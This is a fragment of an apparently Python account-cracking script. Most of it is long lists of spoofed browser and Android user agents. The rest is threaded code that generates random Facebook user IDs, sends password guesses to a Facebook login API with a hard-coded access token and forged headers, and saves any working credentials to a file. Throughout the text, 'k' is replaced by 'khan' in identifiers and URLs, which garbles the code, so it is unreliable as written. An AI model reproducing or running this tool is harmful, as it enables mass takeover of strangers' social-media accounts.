  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebkhanit/601.3.9 (khanHTML, likhane Geckhano) Version/9.0.2 Safari/601.3.9",
  "Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
  "Dalvikhan/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011)",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/khanTU84Q)",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011)",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020)",
  "Dalvikhan/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV",
  "Dalvikhan/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011)",
  "Dalvikhan/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW)",
  "Mozilla/5.0 (Linux; U; Android 4.4.4; skhan-skhan; SAMSUNG SM-G357FZ/G357FZXXU1AQJ1 Build/khanTU84P) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; pl-pl; SM-T310 Build/khanOT49H) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.2.2;pl-pl; Lenovo S5000-F/JDQ39) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.2.2 Mobile Safari/534.30",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/khanOT49H) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30",
  "WeRead/5.2.2 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.3.4 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.2.4 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.1.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.2.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N29)",
  "WeRead/5.1.2 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 7.0; BTV-W09 Build/HUAWEIBEETHOVEN-W09)",
  "WeRead/5.1.2 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.1 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/5.1.0 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.3 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; ELE-L29 Build/HUAWEIELE-L29)",
  "WeRead/5.0.5 WRBrand/huawei Dalvikhan/2.1.0 (Linux; U; Android 10; LYA-AL10 Build/HUAWEILYA-AL10)",
  "WeRead/4.2.3 WRBrand/HUAWEI Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "WeRead/4.1.5 WRBrand/Huawei Dalvikhan/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/3.5.0 WRBrand/HUAWEI Dalvikhan/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00)",
  "WeRead/4.1.1 WRBrand/Huawei Dalvikhan/2.1.0 (Linux; U; Android 7.0; EVA-L09 Build/HUAWEIEVA-L09)",
  "WeRead/4.1.1 WRBrand/HUAWEI Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; HUAWEI RIO-AL00 Build/HuaweiRIO-AL00)",
  "Dalvikhan/2.1.0 (Linux; U; Android 5.1)",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D)"
  "Dalvikhan/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O)",
  "Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29khan) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebookhan.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turkhan Telekhanom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440}",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/khanVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2",
  "Dalvikhan/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100)",
  "Dalvikhan/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD)",
  "Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.3",
  "Dalvikhan/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39)",
  "Mozilla/5.0 (iPad; CPU OS 10_3_3 likhane Mac OS X) AppleWebkhanit/603.3.8 (khanHTML, likhane Geckhano) Mobile/14G60",
  "Dalvikhan/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D)",
  "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Geckhano/20100101 Firefox/58.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.98 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.115 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/89.0.4389.114 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/47.0.2526.106 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Geckhano/20100101 Firefox/85.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/80.0.3987.132 Safari/537.36",
  "Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/81.0.4044.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Geckhano/20100101 Firefox/79.0",
			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QkhanQ1.190825.002; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
		])
		sys.stdout.write(
			"\r [ khan ] %s/%s -> Okhan:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.okhan))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebookhan.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookhanies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebookhan.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_tokhanen=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_khaney" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ khan-Okhan ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.okhan.append("%s|%s"%(uid, pw))
				open("2009-khan-Okhan.txt","a").write(" %s|%s\n"%(uid, pw))
				breakhan
			elif "www.facebookhan.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ khan-Okhan ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-khan-Okhan.txt","a").write(" %s | %s\n"%(uid, pw))
				breakhan
			else:
				continue

		self.loop +=1

	def old2(self):
		x = 1111111111
		xx = 9999999999
		idx = "10000" 
		os.system('clear');print(logo)
		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACkhan LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workhaners=30) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACkhan WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] Okhan RESULTS SAVED IN -> okhan.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACkhan COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice([
			"Dalvikhan/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/khanOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebookhan.khanatana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
			  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; CMDTDF; .NET4.0C; .NET4.0E; GWX:QUALIFIED)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Geckhano/20100101 Firefox/40.0.2 Waterfox/40.0.2",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Geckhano/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskhanbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/khanOT49I.V41010d) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; khanFARWI Build/khanTU84M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Silkhan/3.68 likhane Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; khanFSAWI Build/khanTU84M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Silkhan/3.68 likhane Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Geckhano/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Geckhano/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/600.6.3 (khanHTML, likhane Geckhano) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/600.8.9 (khanHTML, likhane Geckhano)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/601.1.56 (khanHTML, likhane Geckhano) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/600.6.3 (khanHTML, likhane Geckhano) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Geckhano/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Geckhano/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Geckhano/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Geckhano/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Geckhano/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Geckhano/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Geckhano/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Geckhano/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Geckhano/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Geckhano/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Geckhano/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/534.24 (khanHTML, likhane Geckhano) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/605.1.15 (khanHTML, likhane Geckhano) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebkhanit/533.19.4 (khanHTML, likhane Geckhano) Version/5.0.3 Safari/533.19.4",
